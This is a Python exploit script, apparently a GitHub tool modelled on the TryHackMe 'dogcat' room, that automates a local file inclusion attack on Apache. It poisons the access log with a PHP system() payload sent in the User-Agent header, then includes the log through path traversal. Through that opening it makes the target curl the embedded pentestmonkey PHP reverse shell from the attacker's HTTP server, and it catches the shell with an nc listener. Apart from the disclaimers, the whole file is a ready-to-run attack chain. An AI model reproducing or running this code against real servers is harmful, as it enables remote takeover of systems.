disclaimer = """
This script is the digital equivalent of a fireworks display in a library. 
It is not meant to be stealthy, subtle, or remotely covert. It's as conspicuous as 
a marching band in a monastery. Tread with caution, and remember, with great power 
comes great responsibility to not do something monumentally stupid and irresponsible.
This was inspired by the tryhackme "dogcat" room, check it out one day, it's unique.

Intentions:
This script is aimed at educating. It should only be used for educational purposes, it is meant to teach you to some extent, the theory and practices used to set up LFI exploits. This does not cover everything, and the range of attack is very limited, making it great for education, mostly because it only works on old versions of apache, and you would have to have many misconfigurations. Dispite these benefits, there is still a chance it could be used for harm, and I do not condone or take responsibility for these actions as I am not the one abusing this educational tool.

This script also uses the PHP reverse shell from "Pentestmonkey" All credit to "Pentestmonkey" for the php reverse shell.

Now that the first disclaimer is over, let's move over to the legal side of things:

This tool may be used for legal purposes only.  Users take full responsibility for any actions performed using this tool.  The author accepts no liability for damage caused by this tool.  If these terms are not acceptable to you, then do not use this tool.


  #####                                          ### 
 #     #   ##   ##### #####   ##    ####  #    # ### 
 #        #  #    #     #    #  #  #    # #   #  ### 
 #       #    #   #     #   #    # #      ####    #  
 #       ######   #     #   ###### #      #  #       
 #     # #    #   #     #   #    # #    # #   #  ### 
  #####  #    #   #     #   #    #  ####  #    # ### 
                                                     
The not-so-subtle LFI exploit, inspired by the dogcat room in tryhackme.com with it's unique LFI vulnerability.

URL: Must be formatted like so: http://192.168.4.145:port (example IP, port is optional)
IP: Must be formatted like so: 192.168.4.132 (example IP, hostname could also theoretically be used, though I've never tried it out personally.)
CATalystfolder: Must be formatted like so: cats (example of using on a folder named "cats")
CATalystfile: Must be formatted like so: lucky.php (example of using on an existing (or make a new) PHP file which you hopefully have write access on.)
Vulnerable Query String: Must be formatted like so: view (example of using on a query string labeled "view," which would look like this in a URL: "http://example.com/?view=somevalue)

Requirements:
Must have vulnerable apache2 version. (One notable example is the version "Apache/2.4.38 (Debian)")
Must have a logging file in the specified location.
Must have at least one writable PHP file (or at least write permissions.)
"""

import subprocess
import threading
import requests
import time


# Function to start a reverse shell in a separate thread
def start_revshell(revshell_url):
    subprocess.run(['curl', revshell_url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Function to start a netcat listener in a separate thread
def start_nc_listener():
    subprocess.run(['nc', '-lvnp', '9999'])

# Function to start a simple HTTP server on a separate thread
def start_http_server():
    subprocess.run(['python3', '-m', 'http.server', '80'])

# Gather necessary evil details from the user
print(disclaimer)

url = input("Enter the URL (must be in format 'http://IP' or 'https://IP'): ")
ip = input("Enter your listener IP (must be in the format 'IP' yep, confusing right?): ")
catalystfolder = input("Enter the CATalyst folder (A folder that is needed to parse the arguments without erroring out): ")
catalystfile = input("Enter the CATalyst php file (an existing php file you hopefully have write access on): ")
vulnerablequerystring = input("Enter the potentially vulnerable query string (the most critical part of this exploit): ")
php_script = """
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.        NOTE FROM cattack's author: Yes, this also does apply to my tool. I accept no liability, and YOU, not me, are responsible for your actions. I do not condone illegal use of my software.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.    Note from the author of Cattack: This software also is distributed in the hope of it being useful, and has no warranty.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '""" + ip + """';  // This is ugly but, the other approach results in errors for '{' literals...
$port = 9999;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
"""

with open(catalystfile, "w") as file:
    file.write(php_script)

print("Attempting to poison the logfile...")
try:
    # Poisoning the logfile by injecting PHP code via User-Agent header
    headers = {
        "User-Agent": "<?php system($_GET['cmd']); ?>"
    }
    params = {
        vulnerablequerystring: f"./{catalystfolder}/../../../../../var/log/apache2/access.log",
        "ext": ""
    }

    # Sending the request to poison the logfile
    requests.get(url, params=params, headers=headers)
    print("Logfile poisoned. How subtle, it's almost as if nothing happened. Absolutely silent. (sarcasm)")
except Exception as e:
    print(f"Failed spectacularly. Are you sure you're understanding this?:\n{e}")
    exit(1)

print("Launching HTTP server to serve reverse shell payload...")
http_server_thread = threading.Thread(target=start_http_server)
http_server_thread.start()
time.sleep(2)

print("Attempting delivery of payload...")
try:
    payload_url = f"http://{ip}/{catalystfile}"
    params = {
        vulnerablequerystring: f"./{catalystfolder}/../../../../../var/log/apache2/access.log",
        "ext": "",
        "cmd": f"curl {payload_url} -o ./{catalystfile}"
    }

    requests.get(url, params=params)
    print("Payload delivered with the elegance of a bull in a china shop.")
except Exception as e:
    print(f"Mission failed. We'll get 'em next time..or maybe not, since your head is stuck in the clouds:\n{e}")
    exit(1)

print("Launching listener for reverse shell...")
listener_thread = threading.Thread(target=start_nc_listener)
listener_thread.start()

time.sleep(3)  # Ensure nc is actively listening before the grand finale
try:
    print("Attempting to start reverse shell...")
    revshell_url = f"{url}/?{vulnerablequerystring}={catalystfile.rsplit('.', 1)[0]}"
    print(revshell_url)
    start_revshell(revshell_url)
except Exception as e:
    print(f"Well, you almost had it, but something went wrong, open a issue, because this part is not supposed to have errors unless something is very wrong:\n{e}")
    exit(1)

listener_thread.join()
